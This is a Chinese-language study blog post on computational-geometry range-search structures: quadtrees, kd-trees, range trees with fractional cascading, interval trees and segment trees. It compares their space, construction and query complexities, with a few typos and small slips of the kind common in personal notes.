<p>对于任一输入点集，若将其中所有点对中的最长距离、最短距离分别记作$D$和$d$，则$\lambda=D/d$称作$P$的散布度，$P$所对应的四叉树高度为$O(log\lambda)$。</p>
<p>与kd树一样，四叉树中的节点也唯一地对应于某个矩形子区域；同一深度上各节点所对应的子区域面积相等，彼此无交，且它们的并覆盖整个空间。</p>
<p>其中，根节点对应的子区域边长为$D$,其下$4$个子节点所对应的子区域为$D/2$,再下一层的$16$个孙辈节点对应的子区域边长为$D/4$,…最底层节点对应的子区域边长为$d$。</p>
<p>由上可知，整个四叉树的高度不超过$O(log \lambda)$。</p>
<p>基于四叉树的范围查询算法和基于kd树的查询算法基本相同，从递归的角度来看，对于任一节点的查询任务都可分解为对$4$个子节点(细分子区域)的查询子任务。其中，有些子任务需要继续递归(子区域与查询区域的边界相交)，有些子任务则立即以失败返回(子区域与查询的边界相交)，有些子任务则立即以成功返回(子区域完全落在查询范围以内)。</p>
<blockquote>
<p>针对范围查询这一应用，分别从时间、空间角度将四叉树和2d树比较</p>
</blockquote>
<p>尽管四叉树与kd树的算法基本相同，但是却有着本质区别，从而导致其时间、空间性能远不如kd树。主要的原因体现在以下方面：</p>
<p>首先，四叉树中存在大量的空节点，因此在查找过程中即便能够确定某一结点完全落在查询区域内部，也不能在线性时间内枚举出其中有效的各点，通常情况下会远远超过$O(r)$。</p>
<p>另外，四叉树的高度取决于点集的散布度$\lambda$，而不是点集的规模。因此树高没有明确的上限，递归深度和查找长度也难以有效控制，在各点分布极其不均匀的场合，树高往往会远远超过$O(logn)$。</p>
<p>以下对平均情况做一估计：</p>
<p>不妨假定所有点均取自单位正方形$[0,1][0,1]$,对应四叉树高度为$h$。查询矩形区域$R$的长度和宽度分别为$x$和$y$。</p>
<p>在深度为$k$的任一层($0 \leq k\leq h$),共有$4^k$个节点，分别对应于$4^k$个互不相交的子正方形(有些不含任何点)，面积统一为$4^{-k}$。故节点总数为：</p>
<p>$\displaystyle N=\sum_{k=0}^{h}=(4^{h+1}/3) \approx 4^{h+1}/3 $</p>
<p>在深度为$k$的每一层，与查询区域$R$相交(并因此需要耗费时间)的节点总数大致为：</p>
<p>$\displaystyle (x2^k+1)(x2^k+1)=xy4^k+(x+y)2^k+1$</p>
<p>故所有各层与$R$相交者的总数大致为：</p>
<p>$\sum_{k=0}^{h}[xy4^k+(x+y)2^k+1]$</p>
<p>$\approx xy4^{h+1}/3+(x+y)2^{h+1}+(h+1)$</p>
<p>$=xyN+(x+y)\sqrt{3N}+log_4{3N}$</p>
<p>$=O(xyN)$</p>
<p>主要取决于查询区域$R$的面积$xy$,以及四叉树的划分粒度$N$。</p>
<p>将2d树推广至kd树，kd树即k维度上，类似2d树，递归地从${1,2,3,…,k}$对空间进行划分。</p>
<p>针对kd树的范围查询可在$O(r+n^{1-1/d})$时间内完成,kd树的空间复杂度为$O(n)$,在$O(nlogn)$时间内构造一棵kd树。</p>
<h1 id="多层搜索树"><a href="#多层搜索树" class="headerlink" title="多层搜索树"></a>多层搜索树</h1><p>范围查询的另一解法需要借助范围树，首先按照$x$坐标将平面上所有点组织为一棵二叉平衡搜索树，称为主树。该树每个节点各自对应于一个竖直的条带区域：左右孩子所对应的条带互不重叠，均由父节点所对应的条带垂直平分而得；同一深度上所有节点所对应的条带也互相不重叠，而且它们合并后恰好覆盖整个平面。</p>
<p>接下来，分别对于主树中的每一节点，将落在其所对应条带的输入点视为一个输入子集，并同样采用以上方法，按照y坐标将各个子集组织为一棵平衡二叉搜索树，称为关联树，每个关联树所对应的数值条带都会进一步细分为多个矩形区域，这些矩形区域也同样有以上主树各节点所对应的性质。至此，主树与这$O(n)$棵子树构成了一个两层的嵌套结构，即所谓的范围树。</p>
<p>对于任一范围查询$R=[x_1,x_2][y_1,y_2]$,首先按照$[x_1,x_2]$对主树做一次$x$方向上的查询，可得到$O(logn)$个节点，所对应的竖直条带互不重叠，合并后恰好覆盖$x$坐标落在$[x_1,x_2]$范围内的所有输入点。</p>
<p>深入这些节点各自对应的关联树，分别按照$[y_1,y_2]$做一次$y$方向的范围查询。如此从每棵关联树中取出的一系列节点也具有与以上取自主树节点类似的性质，这些节点所对应的矩形区域互不重叠，且它们合并之后恰好覆盖了当前竖直条带内$y$坐标落在$[y_1,y_2]$范围内的所有输入点，这些点合并后将给出所有落在$R$中的输入点，不重也不漏。</p>
<blockquote>
<p>范围树的空间复杂度为$O(nlogn)$</p>
</blockquote>
<p>主树自身仅需$O(n)$空间，对于每一点，统计它可能存在于多少棵关联树中</p>
<p>任一点$p$出现在关联树中，当且仅当在主树中，该关联树对应的节点是$p$所对应叶节点的祖先。在平衡二叉搜索树中，每个节点的祖先均不超过$O(logn)$个。</p>
<p>与kd树的查询算法类似，范围树的查询算法首先沿$x$方向做一次范围查找，并在主树中挑选出不超过$O(logn)$个节点。</p>
<p>然后，对于其中的每个节点，在与之对应的关联树种，沿$y$方向各做一次范围查询。关联树中每一棵命中的子树都可通过遍历在线性时间内枚举其中节点。</p>
<p>以上范围查询算法的时间复杂度为$O(r+logn)$。</p>
<ol>
<li><p>对主树的查找耗时$O(logn)$</p>
</li>
<li><p>对$O(logn)$棵关联树的查找分别耗时$O(logn)$，累计即耗时$O(log^2n)$</p>
<p>再计入枚举所需的$O(r)$时间。</p>
</li>
</ol>
<p>拓展到$d$维范围查找，使用$d$级搜索树，构造时间和空间复杂度为$O(nlog^{d-1}n)$,查找时间复杂度为$O(log^d{n}+r)$</p>
<p>在每一次范围查询中，所涉及关联树的查找具有极其强的关联性质,入口参数均为$ [y_1,y_2]$</p>
<p>参考<a href="https://dsa.cs.tsinghua.edu.cn/~deng/cg/cgaa/cgaa.3rd-edn.cn.pdf">计算几何</a>,可借助分散层叠来加速查找。</p>
<p>为此需要在主树中每一父子节点所对应的关联树种添加一系列的索引。</p>
<p><img src="https://i.loli.net/2019/11/16/Rnp8H3196dbYezZ.png"></p>
<p>设主树种的节点$V_l$和$V_r$是$V$的左右孩子，它们各自对应的关联书可简化地表示为有序向量(等效于关联树的中序遍历序列)，于是，在$V$关联树中查找结果可以直接为其孩子节点所利用，相应的查找成本由$O(logn)$降低至$O(1)$。当然，对于最低公共祖先的那棵树，还是需要做一次$O(logn)$的查找。</p>
<p>综上所述，范围树可在$O(logn+logn)=O(logn)$时间内完成查找，并在$O(r)$时间内报告查询结果。</p>
<p>推广至更高维度的情况，分散层叠只针对查找的最后一层有效，其余层上的树仍然需要$O(logn)$的时间来查找。</p>
<p>给定$d$维空间的$n$个点，范围查询可在$O(r+log^{d-1}n)$时间内完成。</p>
<p>对应的范围树需要$O(nlog^{d-1}n)$空间，构造时间复杂度为$O(nlog^{d-1}n)$。</p>
<p>以下对输入点集规模为$n$时$d$($d&gt;2$)维范围查询时各种树的性能对比，可以看出范围树较多层搜索树更优，与kd树的关系是空间换时间。</p>
<table>
<thead>
<tr>
<th></th>
<th>空间复杂度</th>
<th>构造时间复杂度</th>
<th>查询时间复杂度</th>
</tr>
</thead>
<tbody><tr>
<td>kd树</td>
<td>$ O(n)$</td>
<td>$O(nlogn)$</td>
<td>$O(n^{1-1/k}+r)$</td>
</tr>
<tr>
<td>多层搜索树</td>
<td>$O( nlog^{d-1}n)$</td>
<td>$O(nlog^{d-1}n)$</td>
<td>$O(log^{d}n+r)$</td>
</tr>
<tr>
<td>范围树</td>
<td>$O(nlog^{d-1}n)$</td>
<td>$O(nlog^{d-1}n)$</td>
<td>$O(log^{d}n+r)$</td>
</tr>
</tbody></table>
<h1 id="区间树"><a href="#区间树" class="headerlink" title="区间树"></a>区间树</h1><p>kd树、多层搜索树、范围树旨在解决输入点集$P$中哪些点落在给定区间$S$中的问题，而区间树、线段树旨在解决输入区间$S$中哪些区间包含给定点$q$的问题。其中线段树是一个静态结构，用于数据存储查询，不能进行修改；而区间树是支持动态修改和查询的数据结构。</p>
<h2 id="构造算法-1"><a href="#构造算法-1" class="headerlink" title="构造算法"></a>构造算法</h2><p>在所有点线段的端点中($n$条线段有$2n$个端点)中选取中位数，所有区间可分为三个子集</p>
<p>$S_{left}={S_i|x_{i’}&lt;x_{mid}}$</p>
<p>$S_{right}={S_i|x_{mif}&lt;x_{i}}$</p>
<p>$S_{mid}={x_i\leq x_{mid}\leq x_{i’}}$</p>
<p>前两种情况均可递归解决，第三种情况则将第$3$个子集所有端点按序保存在当前层的节点中，如此构造一棵区间树。每个节点中存储$S_{mid}$中的线段，$S_{left}$和$S_{right}$则分别在左、右子树中。</p>
<p>每个端点在树中仅出现一次，共$2n$个端点，故空间复杂度位$O(n)$。按照中点来划分区间，树是哦ing哼的，树高为$O(logn)$，构造算法避免了重复的排序，时间复杂度为$O(nlogn)$。</p>
<p>查询过程中只需判断当前搜索点是否在当前节点$S_{mid}$的每个区间中，然后根据待搜索点与$S_{mid}$中位点的大小关系，决定分支转向，总体时间复杂度为$O(logn)$。</p>
<p>查询时间复杂度为$O(r+logn)$。</p>
<h1 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h1><p>$n$个输入区间至多有$2n$个不同的端点，将$x$轴分成至多$2n+1$个首尾相接的小区间，根据区间排序结果构造二叉平衡搜索树，每个叶节点对应一个小区间，为每个小区间维护对应输入区间的集合可能需要$O(n^2)$空间复杂度。</p>
<h2 id="构造算法-2"><a href="#构造算法-2" class="headerlink" title="构造算法"></a>构造算法</h2><p>若某个输入区间$a$覆盖了一个节点$b$所有的叶节点，同时不可覆盖节点$b$的父节点，则将该输入区间$a$加入节点$b$对应输入区间的集合，则不必在$b$的子树的每个叶节点都存储$a$的信息，每个区间最多在每层存储两次，至多消耗$O(logn)$，于是$n$个节点空间复杂度为$O(nlogn)$。构造时间复杂度为$O(nlogn)$，查询时间复杂度为$O(r+logn)$。</p>
<p>输入区间规模为$n$区间树和线段性能对比</p>
<table>
<thead>
<tr>
<th></th>
<th>空间复杂度</th>
<th>构造时间复杂度</th>
<th>查询时间复杂度</th>
</tr>
</thead>
<tbody><tr>
<td>区间树</td>
<td>$O(n)$</td>
<td>$O(n logn)$</td>
<td>$O(logn+r)$</td>
</tr>
<tr>
<td>线段树</td>
<td>$O(n)$</td>
<td>$O(n logn)$</td>
<td>$O(logn+r)$</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
</search>
